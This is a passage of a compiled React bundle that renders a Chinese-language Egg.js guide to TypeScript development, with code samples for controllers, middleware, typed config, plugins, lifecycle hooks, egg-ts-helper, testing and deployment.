tslint.json",lang:"bash"}),r.a.createElement("h3",{id:"\u63a7\u5236\u5668controller"},r.a.createElement(l["AnchorLink"],{to:"#\u63a7\u5236\u5668controller","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u63a7\u5236\u5668\uff08Controller\uff09"),r.a.createElement(o["a"],{code:"// app/controller/home.ts\nimport { Controller } from 'egg';\n\nexport default class HomeController extends Controller {\n  public async index() {\n    const { ctx, service } = this;\n    const page = ctx.query.page;\n    const result = await service.news.list(page);\n    await ctx.render('home.tpl', result);\n  }\n}",lang:"typescript"}),r.a.createElement("h3",{id:"\u8def\u7531router"},r.a.createElement(l["AnchorLink"],{to:"#\u8def\u7531router","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u8def\u7531\uff08Router\uff09"),r.a.createElement(o["a"],{code:"// app/router.ts\nimport { Application } from 'egg';\n\nexport default (app: Application) => {\n  const { router, controller } = app;\n  router.get('/', controller.home.index);\n};",lang:"typescript"}),r.a.createElement("h3",{id:"\u670d\u52a1service"},r.a.createElement(l["AnchorLink"],{to:"#\u670d\u52a1service","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u670d\u52a1\uff08Service\uff09"),r.a.createElement(o["a"],{code:"// app/service/news.ts\nimport { Service } from 'egg';\n\nexport default class NewsService extends Service {\n  public async list(page?: number): Promise<NewsItem[]> {\n    return [];\n  }\n}\n\nexport interface NewsItem {\n  id: number;\n  title: string;\n}",lang:"typescript"}),r.a.createElement("h3",{id:"\u4e2d\u95f4\u4ef6middleware"},r.a.createElement(l["AnchorLink"],{to:"#\u4e2d\u95f4\u4ef6middleware","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4e2d\u95f4\u4ef6\uff08Middleware\uff09"),r.a.createElement(o["a"],{code:"import { Context } from 'egg';\n\n// \u8fd9\u91cc\u662f\u4f60\u81ea\u5b9a\u4e49\u7684\u4e2d\u95f4\u4ef6\nexport default function fooMiddleware(): any {\n  return async (ctx: Context, next: () => Promise<any>) => {\n    // \u4f60\u53ef\u4ee5\u83b7\u53d6 config \u7684\u914d\u7f6e\uff1a\n    // const config = ctx.app.config;\n    // config.xxx....\n    await next();\n  };\n}",lang:"typescript"}),r.a.createElement("p",null,"\u5f53\u67d0\u4e2a Middleware \u6587\u4ef6\u7684\u540d\u79f0\u4e0e config \u4e2d\u67d0\u4e2a\u5c5e\u6027\u540d\u4e00\u81f4\u65f6\uff0cMiddleware \u4f1a\u81ea\u52a8\u628a\u8fd9\u4e2a\u5c5e\u6027\u4e0b\u7684\u6240\u6709\u914d\u7f6e\u8bfb\u53d6\u8fc7\u6765\u3002"),r.a.createElement("p",null,"\u6211\u4eec\u5047\u5b9a\u4f60\u6709\u4e00\u4e2a Middleware\uff0c\u540d\u79f0\u662f uuid\uff0c\u5176 config.default.js \u4e2d\u914d\u7f6e\u5982\u4e0b\uff1a"),r.a.createElement(o["a"],{code:"'use strict';\n\nimport { EggAppConfig, PowerPartial } from 'egg';\n\nexport default function(appInfo: EggAppConfig) {\n  const config = {} as PowerPartial<EggAppConfig>;\n\n  config.keys = appInfo.name + '123123';\n\n  config.middleware = ['uuid'];\n\n  config.security = {\n    csrf: {\n      ignore: '123',\n    },\n  };\n\n  const bizConfig = {\n    local: {\n      msg: 'local',\n    },\n\n    uuid: {\n      name: 'ebuuid',\n      maxAge: 1000 * 60 * 60 * 24 * 365 * 10,\n    },\n  };\n\n  return {\n    ...config,\n    ...bizConfig,\n  };\n}",lang:"javascript"}),r.a.createElement("p",null,"\u5728\u5bf9\u5e94\u7684 uuid \u4e2d\u95f4\u4ef6\u4e2d\uff1a"),r.a.createElement(o["a"],{code:"// app/middleware/uuid.ts\n\nimport { Context, Application, EggAppConfig } from 'egg';\n\nexport default function uuidMiddleWare(\n  options: EggAppConfig['uuid'],\n  app: Application,\n): any {\n  return async (ctx: Context, next: () => Promise<any>) => {\n    // name \u5c31\u662f config.default.js \u4e2d uuid \u4e0b\u7684\u5c5e\u6027\n    console.info(options.name);\n    await next();\n  };\n}",lang:"typescript"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1aMiddleware \u76ee\u524d\u8fd4\u56de\u503c\u5fc5\u987b\u90fd\u662f ",r.a.createElement("code",null,"any"),"\uff0c\u5426\u5219\u4f7f\u7528 route.get/all \u7b49\u65b9\u6cd5\u7684\u65f6\u5019\u56e0\u4e3a Koa \u7684 ",r.a.createElement("code",null,"IRouteContext")," \u548c Egg \u81ea\u8eab\u7684 ",r.a.createElement("code",null,"Context")," \u4e0d\u517c\u5bb9\u5bfc\u81f4\u7f16\u8bd1\u62a5\u9519\u3002")),r.a.createElement("h3",{id:"\u6269\u5c55extend"},r.a.createElement(l["AnchorLink"],{to:"#\u6269\u5c55extend","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6269\u5c55\uff08Extend\uff09"),r.a.createElement(o["a"],{code:"// app/extend/context.ts\nimport { Context } from 'egg';\n\nexport default {\n  isAjax(this: Context) {\n    return this.get('X-Requested-With') === 'XMLHttpRequest';\n  },\n};\n\n// app.ts\nexport default (app) => {\n  app.beforeStart(async () => {\n    await Promise.resolve('egg + ts');\n  });\n};",lang:"typescript"}),r.a.createElement("h3",{id:"\u914d\u7f6econfig"},r.a.createElement(l["AnchorLink"],{to:"#\u914d\u7f6econfig","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u914d\u7f6e\uff08Config\uff09"),r.a.createElement("p",null,r.a.createElement("code",null,"Config")," \u8fd9\u5757\u7a0d\u5fae\u6709\u70b9\u590d\u6742\uff0c\u56e0\u4e3a\u8981\u652f\u6301\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5728 Controller\uff0cService \u90a3\u8fb9\u4f7f\u7528\u914d\u7f6e\uff0c\u9700\u652f\u6301\u591a\u7ea7\u63d0\u793a\uff0c\u5e76\u81ea\u52a8\u5173\u8054\u3002"),r.a.createElement("li",null,"Config \u5185\u90e8\uff0c ",r.a.createElement("code",null,"config.view = ","{","}")," \u7684\u5199\u6cd5\uff0c\u4e5f\u5e94\u8be5\u652f\u6301\u63d0\u793a\u3002"),r.a.createElement("li",null,"\u5728 ",r.a.createElement("code",null,"config.","{","env","}",".ts")," \u91cc\u53ef\u4ee5\u7528\u5230 ",r.a.createElement("code",null,"config.default.ts")," \u81ea\u5b9a\u4e49\u914d\u7f6e\u7684\u63d0\u793a\u3002")),r.a.createElement(o["a"],{code:"// app/config/config.default.ts\nimport { EggAppInfo, EggAppConfig, PowerPartial } from 'egg';\n\nexport default (appInfo: EggAppInfo) => {\n  const config = {} as PowerPartial<EggAppConfig>;\n\n  // \u8986\u76d6\u6846\u67b6\uff0c\u63d2\u4ef6\u7684\u914d\u7f6e\n  config.keys = appInfo.name + '123456';\n  config.view = {\n    defaultViewEngine: 'nunjucks',\n    mapping: {\n      '.tpl': 'nunjucks',\n    },\n  };\n\n  // \u5e94\u7528\u672c\u8eab\u7684\u914d\u7f6e\n  const bizConfig = {};\n  bizConfig.news = {\n    pageSize: 30,\n    serverUrl: 'https://hacker-news.firebaseio.com/v0',\n  };\n\n  // \u76ee\u7684\u662f\u5c06\u4e1a\u52a1\u914d\u7f6e\u5c5e\u6027\u5408\u5e76\u5230 EggAppConfig \u4e2d\u8fd4\u56de\n  return {\n    // \u5982\u679c\u76f4\u63a5\u8fd4\u56de config \uff0c\u5c06\u8be5\u7c7b\u578b\u5408\u5e76\u5230 EggAppConfig \u7684\u65f6\u5019\u53ef\u80fd\u4f1a\u51fa\u73b0 circulate type \u9519\u8bef\u3002\n    ...(config as {}),\n    ...bizConfig,\n  };\n};",lang:"typescript"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff0c\u4e0a\u9762\u8fd9\u79cd\u5199\u6cd5\uff0c\u5c06 config.default.ts \u4e2d\u8fd4\u56de\u7684\u914d\u7f6e\u7c7b\u578b\u5408\u5e76\u5230 egg \u7684 EggAppConfig \u7c7b\u578b\u4e2d\u9700\u8981 egg-ts-helper \u7684\u914d\u5408\u3002")),r.a.createElement("p",null,"\u5f53 EggAppConfig \u5408\u5e76 config.default.ts \u7684\u7c7b\u578b\u540e\uff0c\u5728\u5176\u4ed6 config.","{","env","}",".ts \u4e2d\u8fd9\u4e48\u5199\u5c31\u4e5f\u53ef\u4ee5\u83b7\u5f97\u5728 config.default.ts \u5b9a\u4e49\u7684\u81ea\u5b9a\u4e49\u914d\u7f6e\u7684\u667a\u80fd\u63d0\u793a\uff1a"),r.a.createElement(o["a"],{code:"// app/config/config.local.ts\nimport { EggAppConfig } from 'egg';\n\nexport default () => {\n  const config = {} as PowerPartial<EggAppConfig>;\n  // \u8fd9\u91cc\u5c31\u53ef\u4ee5\u83b7\u5f97 news \u7684\u667a\u80fd\u63d0\u793a\u4e86\n  config.news = {\n    pageSize: 20,\n  };\n  return config;\n};",lang:"typescript"}),r.a.createElement("p",null,"\u5907\u6ce8\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"TS \u7684 ",r.a.createElement("code",null,"Conditional Types")," \u662f\u6211\u4eec\u80fd\u5b8c\u7f8e\u89e3\u51b3 Config \u63d0\u793a\u7684\u5173\u952e\u3002"),r.a.createElement("li",null,"\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u770b\u4e0b ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/blob/master/index.d.ts"},"egg/index.d.ts")," \u91cc\u9762\u7684 ",r.a.createElement("code",null,"PowerPartial")," \u5b9e\u73b0\u3002")),r.a.createElement(o["a"],{code:"// {egg}/index.d.ts\ntype PowerPartial<T> = {\n  [U in keyof T]?: T[U] extends {} ? PowerPartial<T[U]> : T[U];\n};",lang:"typescript"}),r.a.createElement("h3",{id:"\u63d2\u4ef6plugin"},r.a.createElement(l["AnchorLink"],{to:"#\u63d2\u4ef6plugin","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u63d2\u4ef6\uff08Plugin\uff09"),r.a.createElement(o["a"],{code:"// config/plugin.ts\nimport { EggPlugin } from 'egg';\n\nconst plugin: EggPlugin = {\n  static: true,\n  nunjucks: {\n    enable: true,\n    package: 'egg-view-nunjucks',\n  },\n};\n\nexport default plugin;",lang:"javascript"}),r.a.createElement("h3",{id:"\u751f\u547d\u5468\u671flifecycle"},r.a.createElement(l["AnchorLink"],{to:"#\u751f\u547d\u5468\u671flifecycle","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u751f\u547d\u5468\u671f\uff08Lifecycle\uff09"),r.a.createElement(o["a"],{code:"// app.ts\nimport { Application, IBoot } from 'egg';\n\nexport default class FooBoot implements IBoot {\n  private readonly app: Application;\n\n  constructor(app: Application) {\n    this.app = app;\n  }\n\n  configWillLoad() {\n    // Ready to call configDidLoad,\n    // Config, plugin files are referred,\n    // this is the last chance to modify the config.\n  }\n\n  configDidLoad() {\n    // Config, plugin files have loaded.\n  }\n\n  async didLoad() {\n    // All files have loaded, start plugin here.\n  }\n\n  async willReady() {\n    // All plugins have started, can do some thing before app ready.\n  }\n\n  async didReady() {\n    // Worker is ready, can do some things\n    // don't need to block the app boot.\n  }\n\n  async serverDidReady() {\n    // Server is listening.\n  }\n\n  async beforeClose() {\n    // Do some thing before app close.\n  }\n}",lang:"typescript"}),r.a.createElement("h3",{id:"ts-\u7c7b\u578b\u5b9a\u4e49typings"},r.a.createElement(l["AnchorLink"],{to:"#ts-\u7c7b\u578b\u5b9a\u4e49typings","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"TS \u7c7b\u578b\u5b9a\u4e49\uff08Typings\uff09"),r.a.createElement("p",null,"\u8be5\u76ee\u5f55\u4e3a TS \u7684\u89c4\u8303\uff0c\u5728\u91cc\u9762\u7684 ",r.a.createElement("code",null,"**/*.d.ts")," \u6587\u4ef6\u5c06\u88ab\u81ea\u52a8\u8bc6\u522b\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5f00\u53d1\u8005\u9700\u8981\u624b\u5199\u7684\u5efa\u8bae\u653e\u5728 ",r.a.createElement("code",null,"typings/index.d.ts")," \u4e2d\u3002"),r.a.createElement("li",null,"\u5de5\u5177\u4f1a\u81ea\u52a8\u751f\u6210 ",r.a.createElement("code",null,"typings/","{","app,config","}","/**.d.ts")," \uff0c\u8bf7\u52ff\u81ea\u884c\u4fee\u6539\uff0c\u907f\u514d\u88ab\u8986\u76d6\u3002\uff08\u89c1\u4e0b\u6587\uff09")),r.a.createElement("hr",null),r.a.createElement("h2",{id:"\u5f00\u53d1\u671f"},r.a.createElement(l["AnchorLink"],{to:"#\u5f00\u53d1\u671f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5f00\u53d1\u671f"),r.a.createElement("h3",{id:"ts-node"},r.a.createElement(l["AnchorLink"],{to:"#ts-node","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"ts-node"),r.a.createElement("p",null,r.a.createElement("code",null,"egg-bin")," \u5df2\u7ecf\u5185\u5efa\u4e86 ",r.a.createElement(l["Link"],{to:"https://github.com/TypeStrong/ts-node"},"ts-node")," \uff0c",r.a.createElement("code",null,"egg loader")," \u5728\u5f00\u53d1\u671f\u4f1a\u81ea\u52a8\u52a0\u8f7d ",r.a.createElement("code",null,"*.ts")," \u5e76\u5185\u5b58\u7f16\u8bd1\u3002"),r.a.createElement("p",null,"\u76ee\u524d\u5df2\u652f\u6301 ",r.a.createElement("code",null,"dev")," / ",r.a.createElement("code",null,"debug")," / ",r.a.createElement("code",null,"test")," / ",r.a.createElement("code",null,"cov")," \u3002"),r.a.createElement("p",null,"\u5f00\u53d1\u8005\u4ec5\u9700\u7b80\u5355\u914d\u7f6e\u4e0b ",r.a.createElement("code",null,"package.json")," \uff1a"),r.a.createElement(o["a"],{code:'{\n  "name": "showcase",\n  "egg": {\n    "typescript": true\n  }\n}',lang:"json"}),r.a.createElement("h3",{id:"egg-ts-helper"},r.a.createElement(l["AnchorLink"],{to:"#egg-ts-helper","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"egg-ts-helper"),r.a.createElement("p",null,"\u7531\u4e8e Egg \u7684\u81ea\u52a8\u52a0\u8f7d\u673a\u5236\uff0c\u5bfc\u81f4 TS \u65e0\u6cd5\u9759\u6001\u5206\u6790\u4f9d\u8d56\uff0c\u5173\u8054\u63d0\u793a\u3002"),r.a.createElement("p",null,"\u5e78\u4e8f TS \u9ed1\u9b54\u6cd5\u6bd4\u8f83\u591a\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 TS \u7684 ",r.a.createElement(l["Link"],{to:"https://www.typescriptlang.org/docs/handbook/declaration-merging.html"},"Declaration Merging")," \u7f16\u5199 ",r.a.createElement("code",null,"d.ts")," \u6765\u8f85\u52a9\u3002"),r.a.createElement("p",null,"\u8b6c\u5982 ",r.a.createElement("code",null,"app/service/news.ts")," \u4f1a\u81ea\u52a8\u6302\u8f7d\u4e3a ",r.a.createElement("code",null,"ctx.service.news")," \uff0c\u901a\u8fc7\u5982\u4e0b\u5199\u6cd5\u5373\u8bc6\u522b\u5230\uff1a"),r.a.createElement(o["a"],{code:"// typings/app/service/index.d.ts\nimport News from '../../../app/service/News';\n\ndeclare module 'egg' {\n  interface IService {\n    news: News;\n  }\n}",lang:"typescript"}),r.a.createElement("p",null,"\u624b\u52a8\u5199\u8fd9\u4e9b\u6587\u4ef6\uff0c\u672a\u514d\u6709\u70b9\u7e41\u7410\uff0c\u56e0\u6b64\u6211\u4eec\u63d0\u4f9b\u4e86 ",r.a.createElement(l["Link"],{to:"https://github.com/whxaxes/egg-ts-helper"},"egg-ts-helper")," \u5de5\u5177\u6765\u81ea\u52a8\u5206\u6790\u6e90\u7801\u751f\u6210\u5bf9\u5e94\u7684 ",r.a.createElement("code",null,"d.ts")," \u6587\u4ef6\u3002"),r.a.createElement("p",null,"\u53ea\u9700\u914d\u7f6e\u4e0b ",r.a.createElement("code",null,"package.json")," :"),r.a.createElement(o["a"],{code:'{\n  "egg": {\n    "declarations": true\n  },\n  "scripts": {\n    "dev": "egg-bin dev",\n    "test-local": "egg-bin test",\n    "clean": "ets clean"\n  }\n}',lang:"json"}),r.a.createElement("p",null,"\u5f00\u53d1\u671f\u5c06\u81ea\u52a8\u751f\u6210\u5bf9\u5e94\u7684 ",r.a.createElement("code",null,"d.ts")," \u5230 ",r.a.createElement("code",null,"typings/","{","app,config","}","/")," \u4e0b\uff0c",r.a.createElement("strong",null,"\u8bf7\u52ff\u81ea\u884c\u4fee\u6539\uff0c\u907f\u514d\u88ab\u8986\u76d6"),"\u3002"),r.a.createElement("p",null,"\u76ee\u524d\u8be5\u5de5\u5177\u5df2\u7ecf\u80fd\u652f\u6301 ts \u4ee5\u53ca js \u7684 egg \u9879\u76ee\uff0c\u5747\u80fd\u83b7\u5f97\u76f8\u5e94\u7684\u667a\u80fd\u63d0\u793a\u3002"),r.a.createElement("h3",{id:"\u5355\u5143\u6d4b\u8bd5\u548c\u8986\u76d6\u7387unit-test-and-cov"},r.a.createElement(l["AnchorLink"],{to:"#\u5355\u5143\u6d4b\u8bd5\u548c\u8986\u76d6\u7387unit-test-and-cov","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5355\u5143\u6d4b\u8bd5\u548c\u8986\u76d6\u7387\uff08Unit Test and Cov\uff09"),r.a.createElement("p",null,"\u5355\u5143\u6d4b\u8bd5\u5f53\u7136\u5c11\u4e0d\u4e86\uff1a"),r.a.createElement(o["a"],{code:"// test/app/service/news.test.ts\nimport assert from 'assert';\nimport { Context } from 'egg';\nimport { app } from 'egg-mock/bootstrap';\n\ndescribe('test/app/service/news.test.js', () => {\n  let ctx: Context;\n\n  before(async () => {\n    ctx = app.mockContext();\n  });\n\n  it('list()', async () => {\n    const list = await ctx.service.news.list();\n    assert(list.length === 30);\n  });\n});",lang:"typescript"}),r.a.createElement("p",null,"\u8fd0\u884c\u547d\u4ee4\u4e5f\u8ddf\u4e4b\u524d\u4e00\u6837\uff0c\u5e76\u5185\u7f6e\u4e86 ",r.a.createElement("code",null,"\u9519\u8bef\u5806\u6808\u548c\u8986\u76d6\u7387")," \u7684\u652f\u6301\uff1a"),r.a.createElement(o["a"],{code:'{\n  "name": "showcase",\n  "egg": {\n    "typescript": true,\n    "declarations": true\n  },\n  "scripts": {\n    "test": "npm run lint -- --fix && npm run test-local",\n    "test-local": "egg-bin test",\n    "cov": "egg-bin cov",\n    "lint": "tslint ."\n  }\n}',lang:"json"}),r.a.createElement("h3",{id:"\u8c03\u8bd5debug"},r.a.createElement(l["AnchorLink"],{to:"#\u8c03\u8bd5debug","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u8c03\u8bd5\uff08Debug\uff09"),r.a.createElement("p",null,"\u65ad\u70b9\u8c03\u8bd5\u8ddf\u4e4b\u524d\u4e5f\u6ca1\u5565\u533a\u522b\uff0c\u4f1a\u81ea\u52a8\u901a\u8fc7 ",r.a.createElement("code",null,"sourcemap")," \u65ad\u70b9\u5230\u6b63\u786e\u7684\u4f4d\u7f6e\u3002"),r.a.createElement(o["a"],{code:'{\n  "name": "showcase",\n  "egg": {\n    "typescript": true,\n    "declarations": true\n  },\n  "scripts": {\n    "debug": "egg-bin debug",\n    "debug-test": "npm run test-local"\n  }\n}',lang:"json"}),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://eggjs.org/zh-cn/core/development.html#%E4%BD%BF%E7%94%A8-vscode-%E8%BF%9B%E8%A1%8C%E8%B0%83%E8%AF%95"},"\u4f7f\u7528 VSCode \u8fdb\u884c\u8c03\u8bd5")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/atian25/blog/issues/25"},"VSCode \u8c03\u8bd5 Egg \u5b8c\u7f8e\u7248 - \u8fdb\u5316\u53f2"))),r.a.createElement("hr",null),r.a.createElement("h2",{id:"\u90e8\u7f72deploy"},r.a.createElement(l["AnchorLink"],{to:"#\u90e8\u7f72deploy","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u90e8\u7f72\uff08Deploy\uff09"),r.a.createElement("h3",{id:"\u6784\u5efabuild"},r.a.createElement(l["AnchorLink"],{to:"#\u6784\u5efabuild","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6784\u5efa\uff08Build\uff09"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u6b63\u5f0f\u73af\u5883\u4e0b\uff0c\u6211\u4eec\u66f4\u503e\u5411\u4e8e\u628a ts \u6784\u5efa\u4e3a js \uff0c\u5efa\u8bae\u5728 ",r.a.createElement("code",null,"ci")," \u4e0a\u6784\u5efa\u5e76\u6253\u5305\u3002")),r.a.createElement("p",null,"\u914d\u7f6e ",r.a.createElement("code",null,"package.json")," :"),r.a.createElement(o["a"],{code:'{\n  "devDependencies": {\n    "@eggjs/tsconfig": "^1.0.0"\n  },\n  "egg": {\n    "typescript": true,\n    "declarations": true\n  },\n  "scripts": {\n    "start": "egg-scripts start --title=egg-server-showcase",\n    "stop": "egg-scripts stop --title=egg-server-showcase",\n    "tsc": "ets && tsc -p tsconfig.json",\n    "ci": "npm run lint && npm run cov && npm run tsc",\n    "clean": "ets clean"\n  }\n}',lang:"json"}),r.a.createElement("p",null,"\u5bf9\u5e94\u7684 ",r.a.createElement("code",null,"tsconfig.json")," :"),r.a.createElement(o["a"],{code:'{\n  "extends": "@eggjs/tsconfig",\n  "exclude": ["app/public", "app/web", "app/views"]\n}',lang:"json"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1a\u5f53\u6709\u540c\u540d\u7684 ts \u548c js \u6587\u4ef6\u65f6\uff0cegg \u4f1a\u4f18\u5148\u52a0\u8f7d js \u6587\u4ef6\u3002\u56e0\u6b64\u5728\u5f00\u53d1\u671f\uff0c",r.a.createElement("code",null,"egg-ts-helper")," \u4f1a\u81ea\u52a8\u8c03\u7528\u6e05\u9664\u540c\u540d\u7684 ",r.a.createElement("code",null,"js")," \u6587\u4ef6\uff0c\u4e5f\u53ef ",r.a.createElement("code",null,"npm run clean")," \u624b\u52a8\u6e05\u9664\u3002")),r.a.createElement("h3",{id:"\u9519\u8bef\u5806\u6808error-stack"},r.a.createElement(l["AnchorLink"],{to:"#\u9519\u8bef\u5806\u6808error-stack","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u9519\u8bef\u5806\u6808\uff08Error Stack\uff09"),r.a.createElement("p",null,"\u7ebf\u4e0a\u670d\u52a1\u7684\u4ee3\u7801\u662f\u7ecf\u8fc7\u7f16\u8bd1\u540e\u7684 js\uff0c\u800c\u6211\u4eec\u671f\u671b\u770b\u5230\u7684\u9519\u8bef\u5806\u6808\u662f\u6307\u5411 TS \u6e90\u7801\u3002 \u56e0\u6b64\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5728\u6784\u5efa\u7684\u65f6\u5019\uff0c\u9700\u914d\u7f6e ",r.a.createElement("code",null,"inlineSourceMap: true")," \u5728 js \u5e95\u90e8\u63d2\u5165 sourcemap \u4fe1\u606f\u3002"),r.a.createElement("li",null,"\u5728 ",r.a.createElement("code",null,"egg-scripts")," \u5185\u5efa\u4e86\u5904\u7406\uff0c\u4f1a\u81ea\u52a8\u7ea0\u6b63\u4e3a\u6b63\u786e\u7684\u9519\u8bef\u5806\u6808\uff0c\u5e94\u7528\u5f00\u53d1\u8005\u65e0\u9700\u62c5\u5fc3\u3002")),r.a.createElement("p",null,"\u5177\u4f53\u5185\u5e55\u53c2\u89c1\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://zhuanlan.zhihu.com/p/26267678"},"https://zhuanlan.zhihu.com/p/26267678")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-scripts/pull/19"},"https://github.com/eggjs/egg-scripts/pull/19"))),r.a.createElement("hr",null),r.a.createElement("h2",{id:"\u63d2\u4ef6--\u6846\u67b6\u5f00\u53d1\u6307\u5357"},r.a.createElement(l["AnchorLink"],{to:"#\u63d2\u4ef6--\u6846\u67b6\u5f00\u53d1\u6307\u5357","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u63d2\u4ef6 / \u6846\u67b6\u5f00\u53d1\u6307\u5357"),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6307\u5bfc\u539f\u5219\uff1a")),r.a.createElement("ul",null,r.a.createElement("li",null,"\u4e0d\u5efa\u8bae\u4f7f\u7528 TS \u76f4\u63a5\u5f00\u53d1\u63d2\u4ef6/\u6846\u67b6\uff0c\u53d1\u5e03\u5230 npm \u7684\u63d2\u4ef6\u5e94\u8be5\u662f js \u5f62\u5f0f\u3002"),r.a.createElement("li",null,"\u5f53\u4f60\u5f00\u53d1\u4e86\u4e00\u4e2a\u63d2\u4ef6/\u6846\u67b6\u540e\uff0c\u9700\u8981\u63d0\u4f9b\u5bf9\u5e94\u7684 ",r.a.createElement("code",null,"index.d.ts")," \u3002"),r.a.createElement("li",null,"\u901a\u8fc7 ",r.a.createElement(l["Link"],{to:"https://www.typescriptlang.org/docs/handbook/declaration-merging.html"},"Declaration Merging")," \u5c06\u63d2\u4ef6/\u6846\u67b6\u7684\u529f\u80fd\u6ce8\u5165\u5230 Egg \u4e2d\u3002"),r.a.createElement("li",null,"\u90fd\u6302\u8f7d\u5230 ",r.a.createElement("code",null,"egg")," \u8fd9\u4e2a module\uff0c\u4e0d\u8981\u7528\u4e0a\u5c42\u6846\u67b6\u3002")),r.a.createElement("h3",{id:"\u63d2\u4ef6"},r.a.createElement(l["AnchorLink"],{to:"#\u63d2\u4ef6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u63d2\u4ef6"),r.a.createElement("p",null,"\u53ef\u4ee5\u53c2\u8003 ",r.a.createElement("code",null,"egg-ts-helper")," \u81ea\u52a8\u751f\u6210\u7684\u683c\u5f0f"),r.a.createElement(o["a"],{code:"// {plugin_root}/index.d.ts\n\nimport 'egg';\nimport News from '../../../app/service/News';\n\ndeclare module 'egg' {\n  // \u6269\u5c55 service\n  interface IService {\n    news: News;\n  }\n\n  // \u6269\u5c55 app\n  interface Application {}\n\n  // \u6269\u5c55 context\n  interface Context {}\n\n  // \u6269\u5c55\u4f60\u7684\u914d\u7f6e\n  interface EggAppConfig {}\n\n  // \u6269\u5c55\u81ea\u5b9a\u4e49\u73af\u5883\n  type EggEnvType = 'local' | 'unittest' | 'prod' | 'sit';\n}",lang:"typescript"}),r.a.createElement("h3",{id:"\u4e0a\u5c42\u6846\u67b6"},r.a.createElement(l["AnchorLink"],{to:"#\u4e0a\u5c42\u6846\u67b6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4e0a\u5c42\u6846\u67b6"),r.a.createElement("p",null,"\u5b9a\u4e49\uff1a"),r.a.createElement(o["a"],{code:"// {framework_root}/index.d.ts\n\nimport * as Egg from 'egg';\n\n// \u5c06\u8be5\u4e0a\u5c42\u6846\u67b6\u7528\u5230\u7684\u63d2\u4ef6 import \u8fdb\u6765\nimport 'my-plugin';\n\ndeclare module 'egg' {\n  // \u8ddf\u63d2\u4ef6\u4e00\u6837\u62d3\u5c55 egg ...\n}\n\n// \u5c06 Egg \u6574\u4e2a export \u51fa\u53bb\nexport = Egg;",lang:"typescript"}),r.a.createElement("p",null,"\u5f00\u53d1\u8005\u4f7f\u7528\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u76f4\u63a5 import \u4f60\u7684\u6846\u67b6\uff1a"),r.a.createElement(o["a"],{code:"// app/service/news.ts\n\n// \u5f00\u53d1\u8005\u5f15\u5165\u4f60\u7684\u6846\u67b6\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5230\u63d0\u793a\u5230\u6240\u6709 Egg \u7684\u63d0\u793a\nimport { Service } from 'duck-egg';\n\nexport default class NewsService extends Service {\n  public async list(page?: number): Promise<NewsItem[]> {\n    return [];\n  }\n}",lang:"typescript"}),r.a.createElement("h2",{id:"\u5e38\u89c1\u95ee\u9898"},r.a.createElement(l["AnchorLink"],{to:"#\u5e38\u89c1\u95ee\u9898","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5e38\u89c1\u95ee\u9898"),r.a.createElement("p",null,"\u6c47\u96c6\u4e00\u4e9b\u6709\u4e0d\u5c11\u4eba\u63d0\u8fc7\u7684 issue \u95ee\u9898\u5e76\u7edf\u4e00\u89e3\u7b54\u3002"),r.a.createElement("h3",{id:"\u8fd0\u884c-npm-start-\u4e0d\u4f1a\u52a0\u8f7d-ts"},r.a.createElement(l["AnchorLink"],{to:"#\u8fd0\u884c-npm-start-\u4e0d\u4f1a\u52a0\u8f7d-ts","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u8fd0\u884c npm start \u4e0d\u4f1a\u52a0\u8f7d ts"),r.a.createElement("p",null,"npm start \u8fd0\u884c\u7684\u662f ",r.a.createElement("code",null,"egg-scripts start"),"\uff0c\u800c\u6211\u4eec\u53ea\u5728 egg-bin \u4e2d\u96c6\u6210\u4e86 